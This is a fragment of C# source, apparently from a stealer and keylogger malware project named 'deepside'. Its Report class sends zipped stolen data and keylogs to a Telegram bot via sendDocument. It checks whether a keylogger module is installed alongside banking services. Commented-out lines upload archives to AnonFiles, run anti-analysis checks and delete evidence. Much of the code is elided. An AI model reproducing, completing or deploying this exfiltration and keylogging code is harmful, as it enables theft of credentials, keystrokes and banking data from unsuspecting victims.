...
namespace deepside.Telegram
{
    internal sealed class Report
    {
        ...
        public static int SendZipArchive(string text)
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    string response = client.DownloadString(
                        TelegramBotAPI + Config.TelegramAPI + "/sendDocument" +
        ...
        private static void UploadKeylogs()
        {
            ...
            //System.Console.WriteLine("Upload key logs : " + url);
        ...
        {
            UploadKeylogs();
            //System.Console.WriteLine("after uploadkeylogs()");
            // Get info
            string stealinfo = (""
            ...
            string info = (""
                ...
                + Counter.GetBValue(Config.klModule == "1" && Counter.BankingServices && Config.Autorun == "1",
                "✅ keykeykey installed", "⛔️ keykeykey not installed")
                + "\n"
            ...
            public static void SendReport(string file)
        {
            ...
            //string url = AnonFiles.Upload(file, GetLatestMessageId() == -1 && !AntiAnalysis.Run());
            ////System.Console.WriteLine(url);
            //File.Delete(file);
            //Logging.Log("Sending report to telegram");
           // SendSystemInfo(url);//url
            //System.Console.WriteLine(Implant.StringsCrypt.ArchivePassword);
